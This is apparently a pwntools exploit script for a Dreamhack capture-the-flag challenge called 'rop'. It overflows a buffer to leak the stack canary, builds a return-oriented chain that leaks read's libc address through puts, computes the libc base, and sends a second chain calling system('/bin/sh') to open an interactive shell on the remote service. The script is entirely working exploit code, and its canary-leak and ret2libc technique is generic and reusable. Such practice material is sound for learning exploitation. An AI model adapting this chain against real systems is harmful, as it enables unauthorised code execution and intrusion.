from pwn import *

p = remote('host3.dreamhack.games', 19695)
e = ELF('./rop')
libc = ELF('./libc.so.6')

buf = b'A' * 0x39
p.sendafter(b'Buf: ', buf)
p.recvuntil(buf)
canary = u64(b'\x00' + p.recvn(7))

main = 0x4006f7
pop = 0x400853
ret = 0x400596
read_got = e.got['read']
puts_plt = e.plt['puts']

buf = b'A' * 0x38 + p64(canary)
buf += b'B' * 0x8
buf += p64(pop) + p64(read_got)
buf += p64(puts_plt)
buf += p64(main)

p.sendafter(b'Buf: ', buf)
read = u64(p.recvn(6) + b'\x00' * 2)
lb = read - libc.symbols['read']
system = lb + libc.symbols['system']
binsh = lb + list(libc.search(b'/bin/sh'))[0]

p.sendafter(b'Buf', b'A' * 0x38)

buf = b'A' * 0x38 + p64(canary)
buf += b'A' * 0x8 + p64(ret)
buf += p64(pop) + p64(binsh)
buf += p64(system)

p.sendafter(b'Buf: ', buf)

p.interactive()